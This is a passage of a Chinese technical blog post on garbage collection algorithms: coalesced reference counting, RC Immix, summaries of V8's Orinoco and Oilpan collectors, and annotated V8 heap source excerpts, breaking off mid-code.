class="line"><span class="comment">// register：注册函数是将指针改动了的 X 和指针改动前被 X 引用的 A 注册到了更改缓冲区。（X和N同上面的例子）</span></span><br><span class="line"><span class="built_in">write_barrier_coalesced_RC</span>(obj, field, dst)&#123;</span><br><span class="line"> <span class="keyword">if</span>(!obj.dirty)</span><br><span class="line"> <span class="built_in"><span class="keyword">register</span></span>(obj)</span><br><span class="line"> obj.field = dst</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">register</span></span>(obj)&#123;</span><br><span class="line"> <span class="keyword">if</span>($mod_buf.size &lt;= $mod_buf.used_size)</span><br><span class="line"> <span class="built_in">garbage_collect</span>()</span><br><span class="line"> entry.obj = obj</span><br><span class="line"> foreach(child_ptr : <span class="built_in">children</span>(obj))</span><br><span class="line"> <span class="keyword">if</span>(*child_ptr != null)</span><br><span class="line"> <span class="built_in">push</span>(entry.children, *child_ptr)</span><br><span class="line"> <span class="built_in">push</span>($mod_buf, entry)</span><br><span class="line"> obj.dirty = <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>【优点】增加了吞吐量。它不是逐次进行计数器的增减处理，而是在某种程度上一并执行，所以能无视增量和减量相抵消的部分。</p><p>【缺点】是增加了 mutator 的暂停时间，这是因为在查找更改缓冲区的过程中需要让mutator 暂停。当然，如果更改缓冲区的大小比较小，就能相应缩短暂停时间，不过这种情况下就没法指望增加吞吐量。这方面需要我们加以权衡好好调整。</p><h4 id="RC-Immix（合并型引用计数法和Immix的融合）"><a href="#RC-Immix（合并型引用计数法和Immix的融合）" class="headerlink" title="RC Immix（合并型引用计数法和Immix的融合）"></a>RC Immix（合并型引用计数法和<strong>Immix</strong>的融合）</h4><p>在以往的合并型引用计数法中，通过查找更改缓冲区，计数器值为 0 的对象会被连接到空闲链表，为之后的分配做准备。这和单纯的引用计数法是一样的。</p><p>Immix 中不是以对象为单位，而是以线为单位进行内存管理的，因此不使用空闲链表。如果线内一个活动对象都没有了，就回收整个线。只要线内还有一个活动对象，这个线就无法作为chunk回收。RC Immix 中不仅对象有计数器，线也有计数器，这样就可以获悉线内是否存在活动对象。不过线的计数器和对象的计数器略有不同。对象的计数器表示的是指向这个对象的引用的数量，而线的计数器表示的是这个线里存在的活动对象的数量。如果这个数变成了 0，就要将线整个回收。下图表示的是线的计数器。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20210927141739788.png" alt="image-20210927141739788"></p><p>为了减少额外负担，线的计数器里记录的不是“指向线内对象的引用的数量”，而是“线内活动对象的数量”。<strong>对象生成和废弃的频率要低于对象间引用关系变化的频率</strong>，这样一来更新计数器所产生的额外负担就小了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里的线包含了所有活动对象，当某个对象的计数器减为0时，线的计数器减一（因为线包含的是活动对象的数量）；当线的计数器减为0时回收整个线。</span></span><br><span class="line"><span class="comment">// 可能出现这种情况，一个线中只有一个对象，而该对象的引用计数为3。那么线的计数为1&lt;对象的引用计数3。</span></span><br><span class="line"><span class="built_in">dec_ref_cnt</span>(obj)&#123;</span><br><span class="line"> obj.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(obj.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in">reclaim_obj</span>(obj)</span><br><span class="line"> line = <span class="built_in">get_line</span>(obj)</span><br><span class="line"> line.ref_cnt--</span><br><span class="line"> <span class="keyword">if</span>(line.ref_cnt == <span class="number">0</span>)</span><br><span class="line"> <span class="built_in">reclaim_line</span>(line)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这样处理可能会有内存碎片，RC Immix算法提供了两种方式进行压缩。</p><p><code>被动碎片整理（Reactive  Defragmentation）</code>：RC Immix 和合并型引用计数法一样，在更改缓冲区满了的时候都会查找更改缓冲区，这时如果发现了新对象，就会把它复制到别的空间去。这里使用的是<strong>Cheney</strong>的<strong>GC</strong>复制算法（遍历的方式进行GC复制算法）。简单来说：更改缓冲区里存放的都是新对象（没有经历过 GC 的对象称为新对象，新对象是在上一次 GC 之后生成的。因此指向新对象的所有指针也是在上一次 GC 之后生成的。更改缓冲区里记录的是从上一次 GC 开始到现在为止指针改动过的对象。所有指向新对象的指针都是在上一次 GC 之后生成的。也就是说，所有引用新对象的对象都被注册到了更改缓冲区。），RC Immix 中以新对象为对象进行压缩。不过被动的碎片整理只会对活动对象中的新对象进行压缩。这样随着程序的逐步运行，旧对象可能会导致碎片化。此外，因为我们是以引用计数法为基础的，所以不能回收循环垃圾。为了解决如上问题，在 RC Immix 里还要进行一项压缩，那就是积极的碎片整理。</p><p><code>积极的碎片整理（Proactive Defragmentation）</code>：上面说被动的碎片整理有两个缺点。一是无法对旧对象进行压缩，二是无法回收有循环引用的垃圾。通过GC标记-压缩算法可以有效的解决这个问题。不过这个碎片整理应该被当作辅助碎片整理来用，毕竟这会增大最大暂停时间。当chunk的总大小下降到一定值（例如全体堆的 10%）时再执行它为好。</p><p>【优点】吞吐量提高的比较明显。据论文记载，与以往的引用计数法相比，其吞吐量平均提升了 12%。根据基准测试程序的情况，甚至会超过搜索型 GC。吞吐量得到改善的原因有两个。其一是导入了合并型引用计数法。因为没有通过写入屏障来执行计数器的增减操作，所以即使对象间的引用关系频繁发生变化，吞吐量也不会下降太多。另一个原因是撤除了空闲链表。通过以线为单位来管理chunk，只要在线内移动指针就可以进行分配了。此外，这里还省去了把chunk重新连接到空闲链表的处理。</p><p>【缺点】RC Immix 和合并型引用计数法一样，都会增加暂停时间。不过如前所述，可以通过调整更改缓冲区的大小来缩短暂停时间。另一个缺点是“只要线内还有一个非垃圾对象，就无法将其回收”。在线的计数器是 1，也就是说线内还有一个活动对象的情况下，会白白消耗大部分线。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有过C或C++开发经验的童靴都知道，C/C++的动态内存（一般是堆内存）是通过malloc等函数手动申请，并交由Free等函数手动释放的，这就需要我们对我们申请的每一块内存负责。如果无限申请资源而不去使用并释放，那么堆内存将会被分配至耗尽浪费系统资源并产生性能问题。如果释放的时候并没有回收空间或者回收多次，或者指向空间的指针没有被置空，那么就可能会出现安全漏洞。</p><p>GC提供了这样一种机制，开发者无需关注这种动态内存的释放问题，具体的实现是通过程序设计语言处理引擎（比如v8）来管理无用对象的垃圾回收，从而大大减少了出bug或者安全漏洞的几率。</p><p>主流的GC算法分为两类，分别是搜索型算法和引用计数法，GC标记-清除算法与GC复制算法等等都需要搜索根，所以他们都属于搜索型算法。而引用计数法独树一帜，当计数为0时可以直接将其清除掉。</p><h2 id="实现篇"><a href="#实现篇" class="headerlink" title="实现篇"></a>实现篇</h2><h3 id="v8"><a href="#v8" class="headerlink" title="v8"></a>v8</h3><h4 id="v8官方博客"><a href="#v8官方博客" class="headerlink" title="v8官方博客"></a>v8官方博客</h4><h5 id="free-garbage-collection"><a href="#free-garbage-collection" class="headerlink" title="free-garbage-collection"></a><a class="link"   href="https://v8.js.cn/blog/free-garbage-collection/" >free-garbage-collection<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2015-08-07</p><p>这里翻译有一些错误，应该翻译为空闲时垃圾回收，作者举的例子为在播放60 帧动画时仍存在idle period，可以利用这段空闲时间进行垃圾回收。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011143254090.png" alt="image-20211011143254090"></p><p>这里使用的垃圾回收思想为分代垃圾回收，新生代使用GC复制算法，而老年代为GC标记-清除算法，不压缩的好处是可以节省一些压缩的时间，坏处还是内存碎片化，分配空间困难等问题。</p><h5 id="jank-busters"><a href="#jank-busters" class="headerlink" title="jank-busters"></a><a class="link"   href="https://v8.js.cn/blog/jank-busters/" >jank-busters<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2015-10-30</p><p>实际上是对最大暂停时间的避免，主要采用了下面几种方式</p><ol><li>之前在分配大量ArrayBuffer 的场景下（例如基于WebGL的应用，WebGL是一个基于JS的3D绘图协议）对这些缓冲区的GC会使最大暂停时间不可避免的变长。此时采取的方式是在每次使用ArrayBuffer 时进行检查来判断是否使用，如果未使用则将其空间释放，这样是将统一处理折衷成了分散处理，每次使用缓冲区都要进行检查可能会影响性能。</li><li>众所周知v8与BLINK有各自的堆空间存放活动对象，当BLINK使用v8对象时，v8需要维护一个状态表去表示那些BLINK区引用的对象，使v8在GC时不去回收这些对象。还是像之前的场景一样，对于WebGL这种会产生大量缓冲区的协议，就需要维护大量这样的全局引用来管理其生命周期。幸运的是，传递给 WebGL 的对象通常只是传递而从未真正修改过，从而可以进行简单的逃逸分析。使用小数组作为参数的 WebGL 函数，可将这个参数数据复制到栈上，减缓GC压力。</li><li>通过并发线程共同处理GC过程。主要清理老年代（新生代的GC复制算法效率很高最大暂停时间很短）。</li></ol><h5 id="jank-busters-two：orinoco"><a href="#jank-busters-two：orinoco" class="headerlink" title="jank-busters-two：orinoco"></a><a class="link"   href="https://v8.js.cn/blog/orinoco/" >jank-busters-two：orinoco<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2016-04-12</p><p>v8团队新命名了代号为<em>Orinoco</em> 的垃圾回收器，Orinoco 基于这样的想法，即在没有严格的分代边界的情况下实现大部分并行和并发的垃圾回收器将减少垃圾回收的 jank 和内存消耗，同时提供高吞吐量。此次的博客主要的性能提升体现在以下三个方面。</p><ol><li>新生代的晋升与老年代的压缩之间没有依赖关系，因此 Orinoco 可以并行执行这些阶段。</li><li>GC复制算法以及压缩过程等都涉及到对象的移动，对象移动的过程中需要更新指向该对象的指针。之前的做法是新生代和每个老年代都维护一个指向该区域的指针列表，但是这样可能会有重复条目的指针，这样多线程操作的时候可能会导致数据争用。改进的方式是对堆空间维护一个标志位区域。指向其他空间的指针位置在其标志位对应处置1，代表该位置有指向其他区域的指针。</li><li>将老年代中分配的所有对象涂黑，这样GC的整个过程都不会操作他们。因为老年代的含义就是比较稳定的对象，所以这个逻辑并没有什么问题。而最终在合适的时机进行老年代对象的垃圾回收。</li></ol><h5 id="Orinoco：新生代垃圾回收"><a href="#Orinoco：新生代垃圾回收" class="headerlink" title="Orinoco：新生代垃圾回收"></a><a class="link"   href="https://v8.js.cn/blog/orinoco-parallel-scavenger/" >Orinoco：新生代垃圾回收<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2017-11-29</p><p>新生代的垃圾回收方式一般为GC复制算法，但是在多线程环境中对GC复制算法的实现是一个问题。</p><p>V8 将其托管堆（managed heap）分成几代，其中对象最初在新生代（young generation）的“区域（nursery）”中分配。在垃圾回收中幸存下来后，对象被复制到中间代（intermediate generation），它仍然是新生代的一部分。在另一次垃圾回收中幸存下来后，这些对象被移动到老年代（old generation）（见图 1）。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011181346083.png" alt="image-20211011181346083"></p><p>文章中介绍了三种新生代使用的GC复制算法</p><ol><li>单线程的GC复制算法。在v6.2之前v8使用的是Cheney的GC复制算法。也就是利用迭代方式实现的。基本和算法篇的描述一致。单线程Cheney算法最初设计时考虑到了最优的单核性能。但从那时起，时代变了。即使在低端的移动设备上，CPU内核也是有很大提升。更重要的是，这些内核通常都是正常运行的。为了充分利用这些内核，V8垃圾收集器必须进行现代化改造。</li><li>并行 Mark-Evacuate。多个线程同时进行新生代对象的复制，这时就需要将对象进行标记，复制完成后将对象取消标记，此时不可避免地to空间会碎片化，这时最后进行压缩的操作。并行标记最大优点是可以确切标记的活动对象。可以通过移动和重链接包含活动对象的页面来避免复制，这些活动对象也是由完整的Mark-Sweep-Compact收集器执行的。然而，在实践中，这在综合基准测试中很常见，很少出现在真正的网站上。并行并行标记的缺点是执行三个单独的锁步阶段的开销。当在堆上调用垃圾收集器时，这种开销尤其明显，堆上的对象大多是死对象，这是许多实际web页面的情况。</li><li>并行Scavenger将标记-复制-修改指针过程变为原子过程，V8使用多线程和负载平衡机制来扫描Root(增量回收)。</li></ol><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011181632340.png" alt="image-20211011181632340"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011203736935.png" alt="image-20211011203736935"></p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011203803245.png" alt="image-20211011203803245"></p><h5 id="Tracing-from-JS-to-the-DOM-and-back-again"><a href="#Tracing-from-JS-to-the-DOM-and-back-again" class="headerlink" title="Tracing from JS to the DOM and back again"></a><a class="link"   href="https://v8.js.cn/blog/tracing-js-dom/" >Tracing from JS to the DOM and back again<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2018-03-01</p><p>功能：Chrome 66以后的版本可以在DevTools中追踪跨v8对象与DOM对象的访问。</p><p>背景：当由于忘记释放无意申请的空间时将会发生内存泄露，原始的DevTools无法跨DOM追踪到js代码，新增的该功能可以更精确的定位到发生泄露的具体对象或函数。</p><p>此时只第一行精准定位到了global_cariable</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011104502343.png" alt="image-20211011104502343"></p><p>此时追踪到了v8的EventListener函数</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011105551582.png" alt="image-20211011105551582"></p><h5 id="并发标记"><a href="#并发标记" class="headerlink" title="并发标记"></a><a class="link"   href="https://v8.js.cn/blog/concurrent-marking/" >并发标记<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2018-06-11</p><p>为了减少stop-the-world的问题采用了增量垃圾回收（三色标记法），V8 使用 Dijkstra 风格的写屏障（write-barrier）机制来解决标记遗漏的问题，但我们也说过，加入写屏障势必降低应用程序的吞吐量，所以可以通过增加线程的方式来处理这个问题，主要方式为并行和并发。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011113051287.png" alt="image-20211011113051287"></p><p>然而最终，主线程通过扫描 root 并填充标记工作表来启动标记。之后，它会在工作线程中发布并发标记任务。工作线程通过合作排除标记工作表来帮助主线程加快标记进度。偶尔主线程通过处理 bailout worklist 和标记工作表来参与标记。标记工作表变空之后，主线程完成垃圾收集。在最终确定期，主线程重新扫描 root，可能会发现更多的白色对象。这些对象在工作线程的帮助下被并行标记。</p><p><img src="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20211011141818684.png" alt="image-20211011141818684"></p><h5 id="2019年更新的Orinoco讨论"><a href="#2019年更新的Orinoco讨论" class="headerlink" title="2019年更新的Orinoco讨论"></a><a class="link"   href="https://v8.js.cn/blog/trash-talk/" >2019年更新的Orinoco讨论<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2019-01-03</p><p>相当于对之前提到的技术进行总结。</p><p>v8宏观上采用了分代垃圾回收的技术。基于的理论是代际假说（The Generational Hypothesis）；代际假说表明很多对象在刚刚分配后随即就释放掉了。新生代使用了前面提到的并行Scavenger技术，核心是GC复制算法。老年代使用了GC标记-清除算法。至于整理，v8采用了一种叫做碎片启发式（fragmentation heuristic）的算法来整理内存页。由于分配内存空间给很多常驻内存（ long-living）的对象时，复制这些对象会带来很高的成本。所以v8只选择整理碎片化比较严重的内存页，并且对其他内存页只进行清除而不是也同样复制活动对象。</p><p>v8中采用了并行垃圾回收、并发垃圾回收、增量式垃圾回收、空闲时回收等方式大大提升了v8的性能。前面也都提到过相关的技术。</p><p><a class="link"   href="https://v8.js.cn/blog/orinoco-parallel-scavenger" >Scavenger 回收器<i class="fas fa-external-link-alt"></i></a>将新生代的垃圾回收时间减少了大约 20% - 50%，<a class="link"   href="https://v8.js.cn/blog/free-garbage-collection" >空闲时垃圾回收器<i class="fas fa-external-link-alt"></i></a>在 Gmail 网页应用空闲的时候将 JavaScript 堆内存减少了 45%。<a class="link"   href="https://v8.js.cn/blog/jank-busters" >并发标记清理<i class="fas fa-external-link-alt"></i></a>可以减少大型 WebGL 游戏的主线程暂停时间，最多可以减少 50%。</p><p>最后提到了BLINK本身也是有一个垃圾收集器叫做Olipan，此时Orinoco尚未与其进行联动。</p><h5 id="high-performance-cpp-gc"><a href="#high-performance-cpp-gc" class="headerlink" title="high-performance-cpp-gc"></a><a class="link"   href="https://v8.js.cn/blog/high-performance-cpp-gc/" >high-performance-cpp-gc<i class="fas fa-external-link-alt"></i></a></h5><p>发布时间 2020-05-26</p><p>启用Oilpan项目的目的是为了用于管理 C++ 内存（因为BLINK引擎对象使用C++实现），该内存可以使用<a class="link"   href="https://research.google/pubs/pub47359/" >跨组件跟踪<i class="fas fa-external-link-alt"></i></a>连接到 V8，该组件将耦合的 C++/JavaScript 对象图视为一个堆（heap）。 Blink 中实现了 Oilpan，但以<a class="link"   href="https://chromium.googlesource.com/v8/v8.git/+/HEAD/include/cppgc/" >垃圾收集库<i class="fas fa-external-link-alt"></i></a>的形式迁移到了 V8。目标是使所有 V8 嵌入程序和更多的 C++ 开发人员都可以轻松使用 C ++ 垃圾回收。</p><p>目前Oilpan的定位相当于一个C++对象回收的模块库，任何项目都可调用。在v8中是与Orinoco配合使用，虽然功能重合，但是Oilpan可以对C++进行GC。</p><p>在目前的文章中介绍的是Oilpan的GC标记-清除算法。在标记阶段实现了并发标记。对于清除阶段，使用了增量与并发清除技术。</p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// incremental-marking.cc并发标记根索引的对象，将对象涂灰并压入处理栈</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IncrementalMarkingRootMarkingVisitor</span> :</span> <span class="keyword">public</span> RootVisitor &#123;</span><br><span class="line">    ...</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">VisitRootPointer</span><span class="params">(Root root, <span class="keyword">const</span> <span class="keyword">char</span>* description,</span></span></span><br><span class="line"><span class="params"><span class="function">                        FullObjectSlot p)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    <span class="built_in">MarkObjectByPointer</span>(p);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">MarkObjectByPointer</span><span class="params">(FullObjectSlot p)</span> </span>&#123;</span><br><span class="line">    Object obj = *p;</span><br><span class="line">    <span class="keyword">if</span> (!obj.<span class="built_in">IsHeapObject</span>()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    heap_-&gt;<span class="built_in">incremental_marking</span>()-&gt;<span class="built_in">WhiteToGreyAndPush</span>(HeapObject::<span class="built_in">cast</span>(obj));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Heap* heap_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental-marking-inl.hWhiteToGreyAndPush函数如名字，将区涂灰并压栈，再往下跟没有意义了</span></span><br><span class="line">MarkCompactCollector* <span class="keyword">const</span> collector_;</span><br><span class="line"><span class="function">MarkingWorklists::Local* <span class="title">local_marking_worklists</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> collector_-&gt;<span class="built_in">local_marking_worklists</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">IncrementalMarking::WhiteToGreyAndPush</span><span class="params">(HeapObject obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">marking_state</span>()-&gt;<span class="built_in">WhiteToGrey</span>(obj)) &#123;</span><br><span class="line">    <span class="built_in">local_marking_worklists</span>()-&gt;<span class="built_in">Push</span>(obj);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// incremental-marking.cc将对象涂黑</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IncrementalMarking::MarkBlackBackground</span><span class="params">(HeapObject obj, <span class="keyword">int</span> object_size)</span> </span>&#123;</span><br><span class="line">  MarkBit mark_bit = <span class="built_in">atomic_marking_state</span>()-&gt;<span class="built_in">MarkBitFrom</span>(obj);</span><br><span class="line">  Marking::MarkBlack&lt;AccessMode::ATOMIC&gt;(mark_bit);</span><br><span class="line">  MemoryChunk* chunk = MemoryChunk::<span class="built_in">FromHeapObject</span>(obj);</span><br><span class="line">  <span class="built_in">IncrementLiveBytesBackground</span>(chunk, <span class="keyword">static_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(object_size));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap\incremental-marking.cc这个是上面官方博客提到的优化措施，将老年代的所有对象涂黑，这样可以一定程度上减缓GC的压力</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">IncrementalMarking::EnsureBlackAllocated</span><span class="params">(Address allocated, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">black_allocation</span>() &amp;&amp; allocated != kNullAddress) &#123;</span><br><span class="line">    HeapObject object = HeapObject::<span class="built_in">FromAddress</span>(allocated);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">marking_state</span>()-&gt;<span class="built_in">IsWhite</span>(object) &amp;&amp; !Heap::<span class="built_in">InYoungGeneration</span>(object)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (heap_-&gt;<span class="built_in">IsLargeObject</span>(object)) &#123;</span><br><span class="line">        <span class="built_in">marking_state</span>()-&gt;<span class="built_in">WhiteToBlack</span>(object);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Page::<span class="built_in">FromAddress</span>(allocated)-&gt;<span class="built_in">CreateBlackArea</span>(allocated,</span><br><span class="line">                                                      allocated + size);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GC reason</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// heap.h枚举了需要用到GC的情况，可以以此为入口点全局搜索字符串来找到所有用到GC的情况。头文件2600行我淦</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">GarbageCollectionReason</span> &#123;</span></span><br><span class="line">  kUnknown = <span class="number">0</span>,</span><br><span class="line">  kAllocationFailure = <span class="number">1</span>,</span><br><span class="line">  kAllocationLimit = <span class="number">2</span>,</span><br><span class="line">  kContextDisposal = <span class="number">3</span>,</span><br><span class="line">  kCountersExtension = <span class="number">4</span>,</span><br><span class="line">  kDebugger = <span class="number">5</span>,</span><br><span class="line">  kDeserializer = <span class="number">6</span>,</span><br><span class="line">  kExternalMemoryPressure = <span class="number">7</span>,</span><br><span class="line">  kFinalizeMarkingViaStackGuard = <span class="number">8</span>,</span><br><span class="line">  kFinalizeMarkingViaTask = <span class="number">9</span>,</span><br><span class="line">  kFullHashtable = <span class="number">10</span>,</span><br><span class="line">  kHeapProfiler = <span class="number">11</span>,</span><br><span class="line">  kTask = <span class="number">12</span>,</span><br><span class="line">  kLastResort = <span class="number">13</span>,</span><br><span class="line">  kLowMemoryNotification = <span class="number">14</span>,</span><br><span class="line">  kMakeHeapIterable = <span class="number">15</span>,</span><br><span class="line">  kMemoryPressure = <span class="number">16</span>,</span><br><span class="line">  kMemoryReducer = <span class="number">17</span>,</span><br><span class="line">  kRuntime = <span class="number">18</span>,</span><br><span class="line">  kSamplingProfiler = <span class="number">19</span>,</span><br><span class="line">  kSnapshotCreator = <span class="number">20</span>,</span><br><span class="line">  kTesting = <span class="number">21</span>,</span><br><span class="line">  kExternalFinalize = <span class="number">22</span>,</span><br><span class="line">  kGlobalAllocationLimit = <span class="number">23</span>,</span><br><span class="line">  kMeasureMemory = <span class="number">24</span>,</span><br><span class="line">  kBackgroundAllocationFailure = <span class="number">25</span>,</span><br><span class="line">  <span class="comment">// If you add new items here, then update the incremental_marking_reason,</span></span><br><span class="line">  <span class="comment">// mark_compact_reason, and scavenge_reason counters in counters.h.</span></span><br><span class="line">  <span class="comment">// Also update src/tools/metrics/histograms/enums.xml in chromium.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// heap.cc搜索GarbageCollectionReason::kRuntime，定位到该函数，首先以原子方式完成增量标记，之后精确的回收全部的垃圾。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Heap::PreciseCollectAllGarbage</span><span class="params">(<span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    GarbageCollectionReason gc_reason,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    <span class="keyword">const</span> GCCallbackFlags gc_callback_flags)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">incremental_marking</span>()-&gt;<span class="built_in">IsStopped</span>()) &#123;</span><br><span class="line">    <span class="built_in">FinalizeIncrementalMarkingAtomically</span>(gc_reason);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">CollectAllGarbage</span>(flags, gc_reason, gc_callback_flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后动态调试追踪一下这个函数，我们使用如下代码触发Minor GC</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123; a[i] = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br></pre></td></tr></table></figure><p>函数原型如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Heap::CollectGarbage</span><span class="params">(AllocationSpace space,</span></span></span><br><span class="line"><span class="params"><span class="function">                          GarbageCollectionReason 